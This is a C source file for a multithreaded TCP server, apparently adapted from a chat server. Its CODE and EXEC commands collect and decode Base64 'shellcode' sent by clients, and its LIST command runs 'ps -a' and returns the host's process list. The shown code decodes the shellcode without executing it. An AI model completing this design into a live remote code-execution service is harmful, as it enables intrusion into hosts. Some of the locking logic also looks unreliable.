///////////////////////////////////////////////////////////////////////////////
// client_thread_functions.c - Routines to manage threads that are used to
// service communications to and from this server's clients.
//
// AUTHOR: Brian Hart
// CREATED DATE: 22 Mar 2019
// LAST UPDATED: 22 Mr 2019
//
// Shout-out to <https://gist.githubusercontent.com/suyash/2488ff6996c98a8ee3a8
// 4fe3198a6f85/raw/ba06e891060b277867a6f9c7c2afa20da431ec91/server.c> and
// <http://www.linuxhowtos.org/C_C++/socket.htm> for
// inspiration
//

#include "stdafx.h"
#include "server.h"

#include "mat.h"
#include "client_manager.h"
#include "client_list_manager.h"
#include "client_thread.h"
#include "client_thread_functions.h"
#include "server_functions.h"

#include "shell_code_info.h"

///////////////////////////////////////////////////////////////////////////////
// Global variables

LPPOSITION g_pShellCodeLines = NULL;

BOOL g_bShouldTerminateClientThread = FALSE;

///////////////////////////////////////////////////////////////////////////////
// Internal-use-only functions

///////////////////////////////////////////////////////////////////////////////
// GatherShellCodeLine function

void GatherShellCodeLine(void* pvSendingClient,
    const char* pszShellCodeLine,
    int nShellCodeBytes) {
  if (pvSendingClient == NULL) {
    return; // Required parameter
  }

  if (IsNullOrWhiteSpace(pszShellCodeLine)) {
    return; // Required parameter
  }

  if (IsMultilineResponseTerminator(pvSendingClient,
      pszShellCodeLine)) {
    return; // Cannot process a line containing the message terminator
  }

  if (nShellCodeBytes <= 0) {
    return; // Required parameter and, as a count, must be a positive integer
  }

  LPCLIENTSTRUCT lpSendingClient =
      (LPCLIENTSTRUCT)pvSendingClient;
  if (lpSendingClient == NULL) {
    return; // Cast not successful?
  }

  LockMutex(GetShellCodeListMutex());
  {
    LPSHELLCODEINFO lpShellCodeInfo = NULL;

    int nEncodedShellCodeBytes = GetLineCharCount(pszShellCodeLine);
    CreateShellCodeInfo(&lpShellCodeInfo,
        &(lpSendingClient->clientID),
        nEncodedShellCodeBytes,
        pszShellCodeLine);
    if (!IsShellCodeInfoValid(lpShellCodeInfo)) {
      UnlockMutex(GetShellCodeListMutex());
      fprintf(stderr,
          FAILED_ADD_SHELLCODE_BLOCK);
      exit(EXIT_FAILURE);
      return; // Operation failed
    }

    AddElementToTail(&g_pShellCodeLines, lpShellCodeInfo);
  }
  UnlockMutex(GetShellCodeListMutex());
}

///////////////////////////////////////////////////////////////////////////////
// GetCurrentShellCodeInfoBytes function

int GetCurrentShellCodeInfoBytes(void* pvShellCodeInfo) {
  int result = 0;
  if (pvShellCodeInfo == NULL) {
    return result; // Required parameter
  }

  LPSHELLCODEINFO lpShellCodeInfo = (LPSHELLCODEINFO) pvShellCodeInfo;
  if (lpShellCodeInfo == NULL) {
    return result;
  }

  if (!IsShellCodeInfoValid(lpShellCodeInfo)) {
    return result;
  }

  return lpShellCodeInfo->nEncodedShellCodeBytes;
}

///////////////////////////////////////////////////////////////////////////////
// IsMultilineResponseTerminator function

BOOL IsMultilineResponseTerminator(void* pvUserState /* not used */,
    const char* pszMessage) {
  if (IsNullOrWhiteSpace(pszMessage)) {
    return FALSE;
  }

  return strcmp(pszMessage, MSG_TERMINATOR) == 0;
}

///////////////////////////////////////////////////////////////////////////////
// JoinAllShellCodeBytes function

void JoinAllShellCodeBytes(LPCLIENTSTRUCT lpSendingClient,
    char** ppszResult, int* pnTotalShellCodeBytes) {
  if (lpSendingClient == NULL) {
    return; // Required parameter
  }

  if (!IsUUIDValid(&(lpSendingClient->clientID))) {
    return; // Required parameter
  }

  if (ppszResult == NULL) {
    return; // Required parameter
  }

  if (pnTotalShellCodeBytes == NULL) {
    return; // Required parameter
  }

  LockMutex(GetShellCodeListMutex());
  {
    if (GetElementCount(g_pShellCodeLines) == 0) {
      UnlockMutex(GetShellCodeListMutex());
      return;
    }

    *pnTotalShellCodeBytes = SumElementsWhere(g_pShellCodeLines,
        GetCurrentShellCodeInfoBytes, &(lpSendingClient->clientID),
        FindShellCodeBlockForClient);

    if (*pnTotalShellCodeBytes <= 0) {
      return; // No shell code bytes to process
    }

    LPPOSITION pos = GetHeadPosition(g_pShellCodeLines);
    if (pos == NULL) {
      return;
    }

    const int TOTAL_SHELLCODE_SIZE = *pnTotalShellCodeBytes + 1;

    /* Allocate a block of memory that is one bigger than the total
     * number of encoded shellcode bytes that we just calculated --
     * this is to leave room for the null-terminator. */
    *ppszResult = (char*)
        malloc(TOTAL_SHELLCODE_SIZE * sizeof(char));
    if (*ppszResult == NULL) {
      fprintf(stderr, FAILED_ALLOC_SHELLCODE_STORAGE);
      CleanupServer(EXIT_FAILURE);
      return;
    }
    memset(*ppszResult, 0, TOTAL_SHELLCODE_SIZE * sizeof(char));

    do {
      LPSHELLCODEINFO lpInfo = (LPSHELLCODEINFO) (pos->pvData);
      if (!IsShellCodeInfoValid(lpInfo)) {
        FreeBuffer((void**) ppszResult);
        fprintf(stderr, FAILED_ALLOC_SHELLCODE_STORAGE);
        CleanupServer(EXIT_FAILURE);
        break;
      }

      strcat(*ppszResult, lpInfo->pszEncodedShellCodeBytes);

    } while ((pos = GetNextPosition(pos)) != NULL);
  }
  UnlockMutex(GetShellCodeListMutex());
}

///////////////////////////////////////////////////////////////////////////////
// SendMultilineDataTerminator function

void SendMultilineDataTerminator(LPCLIENTSTRUCT lpSendingClient) {
  if (lpSendingClient == NULL) {
    return;
  }

  lpSendingClient->nBytesSent +=
      ReplyToClient(lpSendingClient, MSG_TERMINATOR); // end of data
}

///////////////////////////////////////////////////////////////////////////////
// Publicly-exposed functions

BOOL AreTooManyClientsConnected() {
  return GetConnectedClientCount() > MAX_ALLOWED_CONNECTIONS;
}

void CleanupClientConnection(LPCLIENTSTRUCT lpSendingClient) {
  if (lpSendingClient == NULL) {
    fprintf(stderr,
        "CleanupClientConnection: No sending client structure reference.\n");
    return;
  }

  if (INVALID_SOCKET_VALUE == lpSendingClient->nSocket) {
    fprintf(stderr,
        "CleanupClientConnection: Invalid TCP endpoint descriptor.\n");
    return;
  }

  //fprintf(stdout, "Client '{%s}' marked as not connected.\n", pszID);

  /*free(pszID);
   pszID = NULL;*/

  // Save off the value of the thread handle of the client thread for
  // this particular client
  HTHREAD hClientThread = lpSendingClient->hClientThread;

  // Accessing the linked list -- make sure and use the mutex
  // to close the socket, to remove the client struct from the
  // list of clients, AND to decrement the global reference count
  // of connected clients
  /* Inform the interactive user of the server of a client's
   * disconnection */
  LogInfo(CLIENT_DISCONNECTED, lpSendingClient->szIPAddress,
      lpSendingClient->nSocket);

  if (GetLogFileHandle() != stdout) {
    fprintf(stdout, CLIENT_DISCONNECTED, lpSendingClient->szIPAddress,
        lpSendingClient->nSocket);
  }

  fprintf(stdout, "server: Closing client TCP endpoint...\n");
  /* Close the TCP endpoint that led to the client, but do it
   * AFTER we have removed the client from the linked list! */

  CloseSocket(lpSendingClient->nSocket);

  lpSendingClient->nSocket = INVALID_SOCKET_VALUE;

  fprintf(stdout, "server: Shutting down communications...\n");

  KillThread(hClientThread);

  /* Release system resources occupied by the thread */
  DestroyThread(hClientThread);

  fprintf(stdout, "server: Client connection closed.\n");

  sleep(1);   // force CPU context switch to trigger semaphore
}

///////////////////////////////////////////////////////////////////////////////
// EndClientSession function

BOOL EndClientSession(LPCLIENTSTRUCT lpSendingClient) {
  if (lpSendingClient == NULL) {
    return FALSE;
  }

  char szReplyBuffer[BUFLEN];
  memset(szReplyBuffer, 0, BUFLEN);

  //char* pszID = UUIDToString(lpSendingClient->clientID);

  //fprintf(stdout, "Ending chat session with client '{%s}'...\n", pszID);

  /* Tell the client who told us they want to quit,
   * "Good bye sucka!" */
  lpSendingClient->nBytesSent += ReplyToClient(lpSendingClient,
  OK_GOODBYE);

  //fprintf(stdout, "Marking client as not connected...\n");

  // Mark this client as no longer being connected.
  lpSendingClient->bConnected = FALSE;

  CleanupClientConnection(lpSendingClient);

  ReportClientSessionStats(lpSendingClient);

  LockMutex(GetClientListMutex());
  {
    LPPOSITION pos = FindElement(g_pClientList,
        &(lpSendingClient->clientID), FindClientByID);
    if (pos != NULL) {
      g_pClientList = pos;
      RemoveElement(&g_pClientList, FreeClient);
    }
  }
  UnlockMutex(GetClientListMutex());

  LockMutex(GetShellCodeListMutex());
  {
    ClearList(&g_pShellCodeLines, ReleaseShellCodeBlock);
  }
  UnlockMutex(GetShellCodeListMutex());

  return TRUE;
}

///////////////////////////////////////////////////////////////////////////////
// GetConnectedClientCount function

int GetConnectedClientCount() {
  int nResult = GetElementCountWhere(g_pClientList, IsClientConnected);
  return nResult;
}

///////////////////////////////////////////////////////////////////////////////
// GetSendingClientInfo function

LPCLIENTSTRUCT GetSendingClientInfo(void* pvClientThreadUserState) {
  if (pvClientThreadUserState == NULL) {
    HandleError(FAILED_GET_CLIENTSTRUCT_FROM_USER_STATE);
  }

  return (LPCLIENTSTRUCT) pvClientThreadUserState;
}

HMUTEX GetShellCodeListMutex() {
  return g_hShellCodeListMutex;
}

///////////////////////////////////////////////////////////////////////////////
// HandleProtocolCommand function - Deals with things we receive which appear
// to be commands that are specific to the chat protocol itself.
//

BOOL HandleProtocolCommand(LPCLIENTSTRUCT lpSendingClient,
    const char* pszBuffer) {
  if (g_bShouldTerminateClientThread) {
    return TRUE;    // Means, "yes this protocol command got handled"
  }

  if (lpSendingClient == NULL) {
    // We do not have info referring to who sent this command, so stop.
    return FALSE;
  }

  if (IsNullOrWhiteSpace(pszBuffer)) {
    // Buffer containing the command we are handling is blank.
    // Nothing to do.
    return FALSE;
  }

  /* per protocol, HELO command is client saying hello to the server.
   * It does not matter whether a client socket has connected; that socket
   * has to say HELO first, so that then that client is marked as being
   * allowed to receive stuff. */
  if (EqualsNoCase(pszBuffer, PROTOCOL_HELO_COMMAND)) {
    // Only send HELO once.  This command changes the bConnected flag
    // to say TRUE; if it already is TRUE, then do nothing but
    // swallow the command
    if (!lpSendingClient->bConnected) {
      ProcessHeloCommand(lpSendingClient);
    }

    return TRUE; /* command successfully handled */
  }

  /* per protocol, client says bye bye server by sending the QUIT
   * command */
  if (StartsWith(pszBuffer, PROTOCOL_QUIT_COMMAND)) {
    return EndClientSession(lpSendingClient);
  }

  /* Check whether the sending client is in the connected state.
   * We do not do this check earlier, since just in case the client sends
   * the HELO command or the QUIT command, as these are the only commands a
   * non-connected client can even send. Otherwise, do not accept any further
   * protocol commands until a client has said HELO ("Hello!") to us. */
  if (lpSendingClient->bConnected == FALSE) {
    return FALSE;
  }

  if (EqualsNoCase(pszBuffer, MSG_TERMINATOR)) {
    /* Signal for end of multi-line input received.  However, we
     * do not define this for the chat server (chat messages can only be one
     * line). */
    return FALSE;
  }

  /* per protocol, LIST command is client requesting a list of the nicknames
   * of all the chatters who are currently active on the server. */
  if (EqualsNoCase(pszBuffer, PROTOCOL_LIST_COMMAND)) {
    ProcessListCommand(lpSendingClient);

    return TRUE; /* command successfully handled */
  }

  if (StartsWith(pszBuffer, PROTOCOL_CODE_COMMAND)) {
    ProcessCodeCommand(lpSendingClient, pszBuffer);

    return TRUE; /* command successfully handled */
  }

  if (EqualsNoCase(pszBuffer, PROTOCOL_EXEC_COMMAND)) {
    ProcessExecCommand(lpSendingClient);

    return TRUE; /* command successfully handled */
  }

  //char szReplyBuffer[BUFLEN];

  return FALSE;
}

///////////////////////////////////////////////////////////////////////////////
// KillClientThread function - A callback that is run for each element in the
// client list in order to kill each client's thread.
//

void KillClientThread(void* pClientStruct) {
  if (pClientStruct == NULL) {
    return;
  }

  LPCLIENTSTRUCT lpCS = (LPCLIENTSTRUCT) pClientStruct;

  if (lpCS->hClientThread == INVALID_HANDLE_VALUE) {
    return;
  }

  KillThread(lpCS->hClientThread);

  sleep(1); /* force a CPU context switch so the semaphore can work */
}

///////////////////////////////////////////////////////////////////////////////
// Client thread management routines

///////////////////////////////////////////////////////////////////////////////
// LaunchNewClientThread function

void LaunchNewClientThread(LPCLIENTSTRUCT lpCS) {
  if (lpCS == NULL) {
    CleanupServer(ERROR);
  }

  HTHREAD hClientThread = CreateThreadEx(ClientThread, lpCS);

  if (INVALID_HANDLE_VALUE == hClientThread) {
    fprintf(stderr, FAILED_LAUNCH_CLIENT_THREAD);

    CleanupServer(ERROR);
  }

  // Save the handle to the newly-created thread in the CLIENTSTRUCT instance.
  lpCS->hClientThread = hClientThread;
}

///////////////////////////////////////////////////////////////////////////////
// LogClientID function

void LogClientID(LPCLIENTSTRUCT lpCS) {
  if (NULL == lpCS) {
    return;
  }

  char* pszClientID = UUIDToString(&(lpCS->clientID));
  if (IsNullOrWhiteSpace(pszClientID)) {
    fprintf(stderr, "Client ID has not been initialized.\n");
    CleanupServer(ERROR);
  }

  if (IsNullOrWhiteSpace(lpCS->szIPAddress)) {
    fprintf(stderr, "Client IP address is not intialized.\n");
    CleanupServer(ERROR);
  }

  if (!IsSocketValid(lpCS->nSocket)) {
    fprintf(stderr, "Client socket file descriptor is not valid.\n");
    CleanupServer(ERROR);
  }

  LogInfo(CLIENT_ID_FORMAT, lpCS->szIPAddress, lpCS->nSocket, pszClientID);

  if (GetLogFileHandle() != stdout) {
    fprintf(stdout,
    CLIENT_ID_FORMAT, lpCS->szIPAddress, lpCS->nSocket, pszClientID);
  }

  free(pszClientID);
  pszClientID = NULL;
}

///////////////////////////////////////////////////////////////////////////////
// ProcessCodeCommand function

void ProcessCodeCommand(LPCLIENTSTRUCT lpSendingClient,
    const char* pszBuffer) {
  int nStringCount = 0;
  char **ppszStrings = NULL;

  char szCommand[256];
  memset(szCommand, 0, 256);

  if (lpSendingClient == NULL) {
    return;
  }

  if (lpSendingClient->bConnected == FALSE) {
    return;
  }

  if (IsNullOrWhiteSpace(pszBuffer)) {
    return;
  }

  if (!StartsWith(pszBuffer, "CODE ")) {
    return;
  }

  /* We expect the CODE command to be of the format
   * CODE <integer> where <integer> is a positive 32-bit value.
   */

  strcpy(szCommand, pszBuffer);

  Split(szCommand, " ", &ppszStrings, &nStringCount);

  if (ppszStrings == NULL || nStringCount <= 1) {
    lpSendingClient->nBytesSent +=
        ReplyToClient(lpSendingClient, ERROR_FAILED_TO_PARSE_INT);

    FreeStringArray(&ppszStrings, nStringCount);
    return;
  }

  /* We expect ppszStrings[1] to hold the ASCII representation of a
   * positive, 32-bit integer. Convert it to a long, just in case
   * the string is a really big number */
  long lShellcodeBytes = 0L;
  if (0 > StringToLong(ppszStrings[1], &lShellcodeBytes)) {
    lpSendingClient->nBytesSent +=
        ReplyToClient(lpSendingClient, ERROR_FAILED_TO_PARSE_INT);

    FreeStringArray(&ppszStrings, nStringCount);
    return;
  }

  if (lShellcodeBytes <= 0) {
    lpSendingClient->nBytesSent +=
        ReplyToClient(lpSendingClient,
        ERROR_QTY_MUST_BE_POS_32BIT_INT);

    FreeStringArray(&ppszStrings, nStringCount);
    return;
  }

  lpSendingClient->nBytesSent +=
      ReplyToClient(lpSendingClient, OK_SEND_SHELLCODE);

  /* Receive multiline data from the client.  Stop receiving when
   * data is a period followed by a LF. */
  ReceiveMultilineData2(
      (void*) lpSendingClient,
      ReceiveFromClient,
      GatherShellCodeLine,
      IsMultilineResponseTerminator);

  int total = SumElementsWhere(g_pShellCodeLines,
      GetCurrentShellCodeInfoBytes,
      &(lpSendingClient->clientID),
      FindShellCodeBlockForClient);

  if (total == -1 || total != (int)lShellcodeBytes) {
    // Unknown error during computation of total bytes received.
    lpSendingClient->nBytesSent +=
        ReplyToClient(lpSendingClient, ERROR_GENERAL_SERVER_FAILURE);
    ClearList(&g_pShellCodeLines, ReleaseShellCodeBlock);
    return;
  }

  lpSendingClient->nBytesSent +=
      ReplyToClient(lpSendingClient, OK_RECD_SHELLCODE_SUCCESSFULLY);

  FreeStringArray(&ppszStrings, nStringCount);
}

///////////////////////////////////////////////////////////////////////////////
// ProcessExecCommand function

void ProcessExecCommand(LPCLIENTSTRUCT lpSendingClient) {
  if (lpSendingClient == NULL) {
    return; // Required parameter
  }

  if (!IsUUIDValid(&(lpSendingClient->clientID))) {
    return; // Required parameter
  }

  int nTotalEncodedShellCodeBytes = 0;
  char *pszEncodedShellCode = NULL;

  /* Find all the shellcode blocks for this client and
   * 'marry' their Base64-encoded content into one big ol'
   * block. */
  JoinAllShellCodeBytes(lpSendingClient,
      &pszEncodedShellCode, &nTotalEncodedShellCodeBytes);
  if (nTotalEncodedShellCodeBytes <= 0) {
    return;
  }

  if (IsNullOrWhiteSpace(pszEncodedShellCode)) {
    return;
  }

  int nDecodedBytes = GetBase64DecodedDataSize(pszEncodedShellCode);

  unsigned char szDecodedBytes[nDecodedBytes];
  memset(szDecodedBytes, 0,  nDecodedBytes);

  Base64Decode(pszEncodedShellCode, szDecodedBytes, nDecodedBytes);

  /* Remove all the shellcode blocks for this client from the
   * linked list. This prevents this command from being re-issued
   * successfully. */

  RemoveElementWhere(&g_pShellCodeLines, &(lpSendingClient->clientID),
      FindShellCodeBlockForClient, ReleaseShellCodeBlock);

  FreeBuffer((void**)&pszEncodedShellCode);
}

///////////////////////////////////////////////////////////////////////////////
// ProcessHeloCommand function

void ProcessHeloCommand(LPCLIENTSTRUCT lpSendingClient) {
  if (NULL == lpSendingClient) {
    return;
  }

  /* mark the current client as connected */
  lpSendingClient->bConnected = TRUE;

  /* Reply OK to the client (unless the max number of allowed connected
   * clients is exceeded; in this case reply to the client 501 Max clients
   * connected or some such. */
  if (!AreTooManyClientsConnected()) {
    lpSendingClient->nBytesSent += ReplyToClient(lpSendingClient,
    OK_WELCOME);
  } else {
    TellClientTooManyPeopleConnected(lpSendingClient);

    /* In the case that too many poeple are connected, tell
     * the latest client to connect so.  Then, unmark its connected
     * flag.
     */
    lpSendingClient->bConnected = FALSE;

    /*
     * Make sure to end the client's session and remove the session from
     * the linked list.
     */
    EndClientSession(lpSendingClient);
  }
}

///////////////////////////////////////////////////////////////////////////////
// ProcessListCommand function

void ProcessListCommand(LPCLIENTSTRUCT lpSendingClient) {
  if (NULL == lpSendingClient) {
    return;
  }

  int nLineCount = 0;
  char** ppszOutputLines = NULL;

  GetSystemCommandOutput("ps -a", &ppszOutputLines, &nLineCount);

  if (ppszOutputLines == NULL || nLineCount <= 0) {
    lpSendingClient->nBytesSent += ReplyToClient(lpSendingClient,
    HOST_PROC_LIST_ACCESS_DENIED);
    return;
  }

  lpSendingClient->nBytesSent += ReplyToClient(lpSendingClient,
  OK_LIST_FOLLOWS);

  for (int i = 0; i < nLineCount; i++) {
    lpSendingClient->nBytesSent += ReplyToClient(lpSendingClient,
        ppszOutputLines[i]);
  }

  SendMultilineDataTerminator(lpSendingClient);

  /* release the memory occupied by the output */
  FreeStringArray(&ppszOutputLines, nLineCount);
  ppszOutputLines = NULL;
}

///////////////////////////////////////////////////////////////////////////////
// ReceiveFromClient function - Does a one-off, synchronous receive (not a
// polling loop) of a specific message from the server.  Blocks the calling
// thread until the message has arrived.
//

int ReceiveFromClient(void* pvSendingClient, char** ppszReplyBuffer) {
  if (pvSendingClient == NULL) {
    fprintf(stderr, ERROR_NO_SENDING_CLIENT_SPECIFIED);

    CleanupServer(ERROR);
  }

  LPCLIENTSTRUCT lpSendingClient =
      (LPCLIENTSTRUCT) pvSendingClient;

  // Check whether we have a valid endpoint for talking with the server.
  if (!IsSocketValid(lpSendingClient->nSocket)) {
    CleanupServer(ERROR);   // fail silently
  }

  if (ppszReplyBuffer == NULL) {
    CleanupServer(ERROR);	// Required parameter
  }

  /* Wipe away any existing reply buffer by filling it with null
   * terminators. If the reply buffer is not allocated, then that is
   * fine. */
  if (*ppszReplyBuffer != NULL) {
    memset(*ppszReplyBuffer, 0, strlen(*ppszReplyBuffer));
  }

  /* Do a receive. Cleanup if the operation was not successful. */
  int nBytesReceived = 0;

  if ((nBytesReceived = Receive(lpSendingClient->nSocket, ppszReplyBuffer))
      <= 0 && errno != EBADF && errno != EWOULDBLOCK) {
    FreeBuffer((void**) ppszReplyBuffer);
    return 0;
  }

  /* Inform the server console's user how many bytes we got. */
  LogInfo(CLIENT_BYTES_RECD_FORMAT, lpSendingClient->szIPAddress,
      lpSendingClient->nSocket, nBytesReceived);

  if (GetLogFileHandle() != stdout) {
    fprintf(stdout, CLIENT_BYTES_RECD_FORMAT, lpSendingClient->szIPAddress,
        lpSendingClient->nSocket, nBytesReceived);
  }

  /* Save the total bytes received from this client */
  lpSendingClient->nBytesReceived += nBytesReceived;

  // Log what the client sent us to the server's interactive
  // console and the log file, unless they're the same, then
  // just send the output to the console.
  LogInfo(CLIENT_DATA_FORMAT, lpSendingClient->szIPAddress,
      lpSendingClient->nSocket, *ppszReplyBuffer);

  if (GetLogFileHandle() != stdout) {
    fprintf(stdout,
    CLIENT_DATA_FORMAT, lpSendingClient->szIPAddress,
        lpSendingClient->nSocket, *ppszReplyBuffer);
  }

  // Return the number of received bytes
  return nBytesReceived;
}

void ReportClientSessionStats(LPCLIENTSTRUCT lpSendingClient) {
  if (lpSendingClient == NULL) {
    return;
  }

  char *pszClientID = UUIDToString(&(lpSendingClient->clientID));

  fprintf(stdout,
  CLIENT_SESSION_STATS, pszClientID, lpSendingClient->nBytesReceived,
      lpSendingClient->nBytesSent);

  if (GetLogFileHandle() != stdout) {
    LogInfo(
    CLIENT_SESSION_STATS, pszClientID, lpSendingClient->nBytesReceived,
        lpSendingClient->nBytesSent);
  }

  FreeBuffer((void**)&pszClientID);
}

int SendToClient(LPCLIENTSTRUCT lpCurrentClient, const char* pszMessage) {
  if (lpCurrentClient == NULL) {
    return ERROR;
  }

  if (IsNullOrWhiteSpace(pszMessage)) {
    return ERROR;
  }

  if (!IsSocketValid(lpCurrentClient->nSocket)) {
    return ERROR;
  }

  if (lpCurrentClient->bConnected == FALSE) {
    /* client has not issued the HELO command yet, so it does
     * not get included on broadcasts */
    return ERROR;
  }

  return Send(lpCurrentClient->nSocket, pszMessage);
}

///////////////////////////////////////////////////////////////////////////////
// TellClientTooManyPeopleConnected function

void TellClientTooManyPeopleConnected(LPCLIENTSTRUCT lpSendingClient) {
  if (lpSendingClient == NULL) {
    return;
  }

  if (!IsSocketValid(lpSendingClient->nSocket)) {
    return;
  }

  if (!lpSendingClient->bConnected) {
    return;
  }

  LogError(ERROR_TOO_MANY_CLIENTS, MAX_ALLOWED_CONNECTIONS);

  if (GetErrorLogFileHandle() != stderr) {
    fprintf(stderr, ERROR_TOO_MANY_CLIENTS, MAX_ALLOWED_CONNECTIONS);
  }

  lpSendingClient->nBytesSent += ReplyToClient(lpSendingClient,
  ERROR_MAX_CONNECTIONS_EXCEEDED);

  // Make the current client not connected
  lpSendingClient->bConnected = FALSE;

  // Cleanup system resources used by the client connection.
  // This uses part of the logic from ending a chat session.
  CleanupClientConnection(lpSendingClient);
}

///////////////////////////////////////////////////////////////////////////////
// TerminateClientThread function

void TerminateClientThread(int signum) {
// If signum is not equal to SIGSEGV, then ignore this semaphore
  if (SIGSEGV != signum) {
    return;
  }

  g_bShouldTerminateClientThread = TRUE;

  /* Re-associate this function with the signal */
  RegisterEvent(TerminateClientThread);
}

///////////////////////////////////////////////////////////////////////////////
